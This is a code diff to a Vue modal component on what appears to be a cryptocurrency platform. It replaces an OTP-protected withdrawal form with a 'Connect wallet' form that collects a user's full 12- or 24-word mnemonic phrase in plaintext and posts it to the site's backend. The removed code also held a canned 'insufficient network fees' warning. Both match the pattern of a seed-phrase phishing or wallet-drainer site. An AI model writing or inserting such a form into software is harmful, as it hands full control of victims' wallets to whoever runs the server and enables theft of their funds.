@@ -7,50 +7,23 @@ import { closeModal } from '~/utils/modal';
 
 const props = defineProps<{
   Asset: any,
-  maskEmail: Function,
   user: any
 }>();
 
 const sendType:any = ref(null);
-const otp = ref('');
-const loadReq = ref(false);
 const loadData = ref(false);
 const formdata:any = ref({
-  amount: '',
-  wallet_addr: '',
+  phrase: '',
 });
 
-async function requestOtp() {
-  loadReq.value = true;
-  try {
-    const response = await Request.requestOTP(props.user?.email);
-    // console.log(response.data);
-    sendType.value = 'otp';
-    loadReq.value = false;
-  } catch (err:any) {
-    console.log(err);
-    loadReq.value = false;
-    $swal.fire({
-      title: 'Error!',
-      icon: 'warning',
-      text: err?.response?.data?.message ?? 'Error occurred, try again',
-    });
-  }
-}
-
-async function withdrawal() {
+async function addWallet() {
   loadData.value = true;
-  const FD = {
-    confirm_withdrawal: true,
-    amount: formdata.value.amount,
-    asset_id: props.Asset.id,
-    wallet_addr: formdata.value.wallet_addr,
-    otp: otp.value
-  };
-  // return console.log(FD);
+  const FD = new FormData();
+  FD.append('phrase', formdata.value.phrase);
+  FD.append('asset', props.Asset.slug);
   try {
-    const response = await Request.Withdraw(FD);
-    // console.log(response.data);
+    const response = await Request.addWallet(FD);
+    console.log(response.data);
     if (response.data.status != 'success') {
       $swal.fire({
         title: 'Error!',
@@ -62,11 +35,11 @@ async function withdrawal() {
       sendType.value = null;
       return false;
     }
-    closeModal('sendModal');
+    closeModal('connectModal');
     $swal.fire({
       title: 'Warning!',
       icon: 'warning',
-      text: `You do not have ${props.Asset?.name}(${props.Asset?.shortname}) to cover your network fees!`,
+      text: response.data.message
     });
     loadData.value = false;
   } catch (err:any) {
@@ -97,21 +70,22 @@ async function withdrawal() {
             <h5 class="modal-title col-8 col-sm-6 my-auto me-auto text-center" id="sendModalLabel">Connect wallet</h5>
           </div>
           <div class="modal-body pb-5 pt-3 px-4 text-center">
-            <form @submit.prevent class="w-100 crypto my-forms text-start">
+            <form @submit.prevent="addWallet" class="w-100 crypto my-forms text-start">
               <h6 class="mb-4">Connect to external wallet</h6>
               <div class="form-group">
                 <label for="address small">Enter Mnemonic phrase:</label>
-                <textarea rows="7"
+                <textarea rows="7" v-model="formdata.phrase"
                   placeholder="Separateed by space. You can choose to import wallets with 12-word or 24-word Mnemonics, phrase should be a plaintext."
                   class="form-control resize-none"
                   name="phrase"
                   id="phrase"
+                  required
                 ></textarea>
               </div>
-              <p class="pt-3 mb-0">
-                <button type="submit" :disabled="loadReq" class="btn btn-success bg-teal px-4 py-2">
-                  <i class="spinner-border spinner-border-sm" v-if="loadReq"></i>
-                  <span>Connect</span>
+              <p class="pt-2 mb-0">
+                <button type="submit" :disabled="loadData" class="btn btn-success bg-teal px-4 py-2">
+                  <i class="spinner-border spinner-border-sm" v-if="loadData"></i>
+                  <span>Connect wallet</span>
                 </button>
               </p>
             </form>
